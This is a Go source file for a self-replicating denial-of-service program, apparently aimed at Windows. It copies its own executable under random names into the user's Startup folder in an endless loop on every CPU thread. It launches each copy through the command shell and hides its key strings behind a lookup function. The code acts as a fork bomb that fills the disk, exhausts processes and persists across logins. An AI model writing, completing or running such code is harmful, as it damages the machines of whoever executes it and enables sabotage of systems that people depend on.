package main

import (
	"fmt"
	"io"
	"math/rand"
	"os"
	"os/exec"
	"os/user"
	"path"
	"runtime"
	"strings"
	"time"
)

var __DEBUG_str string = "true"
var DEBUG bool

// ? Assigns DEBUG based on the value of __DEBUG_str
func checkDebug() {
	fmt.Println(__DEBUG_str)
	DEBUG = __DEBUG_str == "true"
}

// ? Prints text to the console if DEBUG == true
func verbose(prefix string, log ...any) {
	if DEBUG {
		log_s := fmt.Sprintf("%v", log...)
		if log_s != "" && len(prefix) > 4 {
			panic(fmt.Sprintf("Log prefix length cannot be > 4 characters: %s", prefix))
		}

		fmt.Printf("[%s]:\t%s\n", prefix, log_s)
	}
}

// ? Get the current processes startup folder
func getProcessFolder() string {
	path, err := os.Executable()
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	return path
}

// ? Get the current username
func getUsername() string {
	user, err := user.Current()

	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	name_a := strings.Split(user.Username, "\\")
	name := name_a[len(name_a)-1]

	return name
}

// ? Start a process (should be used with 'go')
func startProc(cmd string) {
	proc := exec.Command(getStr(CMD_EXE), getStr(_C), getStr(START), cmd)
	err := proc.Start()
	if err != nil {
		fmt.Println(err)
		return
	}
}

// ? Copy a file to.. Somewhere else
func copy(srcFile string, dstFile string) {
	src, err := os.Open(srcFile)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer src.Close()

	dst, err := os.Create(dstFile)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer dst.Close()

	_, err = io.Copy(dst, src)
	if err != nil {
		fmt.Println(err)
		return
	}
}

// ? Creates a directory if it doesn't already exist
func ensureDir(directory string) {
	if _, err := os.Stat(directory); os.IsNotExist(err) {
		err = os.MkdirAll(directory, 0755)
		if err != nil {
			fmt.Println(err)
			return
		}
	}
}

// ? Starts an infinite loop, copying then running
func whileCopy(src string, targetDir string, fileNameBase string) {
	ensureDir(targetDir)

	targetFile := path.Join(targetDir, fileNameBase)

	// Infinite loop (Like [C#]: while (true) {})
	for {
		tmpName := fmt.Sprintf(getStr(NEW_NAME_FORMATTER), targetFile, rand.Int63())

		// Copy cannot use the 'go' keyword or the .exe won't exist
		// by the time we're calling it
		copy(src, tmpName)

		if !DEBUG {
			// Use 'go' to "fork" (process won't return)
			go startProc(tmpName)
		}
	}
}

// ? Entry point
func main() {
	// Initialize DEBUG
	checkDebug()

	// Folder pointing to this app
	this := getProcessFolder()
	verbose("this", this)

	// Current username (minus the hostname)
	user := getUsername()
	verbose("user", user)

	// User startup folder
	startup := fmt.Sprintf(getStr(STARTUP_FOLDER_FORMATTER), user)
	verbose("strt", startup)

	if DEBUG {
		// Use this to verify it works
		startup = fmt.Sprintf(getStr(DEBUG_STARTUP_FOLDER_FORMATTER), user)
		verbose("rsgn", startup)
	}

	// Get the number of threads the CPU supports
	threads := runtime.NumCPU()

	// os.Exit(0)

	verbose("Begin...", "")
	for i := 0; i < threads; i++ {
		verbose("gort", "Start ", i)

		// Start copying on a new goroutine
		go whileCopy(this, startup, getStr(FOK)) // ".exe" is added in whileCopy()->copy()
	}

	// Prevent app exit
	for {
		time.Sleep(time.Hour)
	}
}
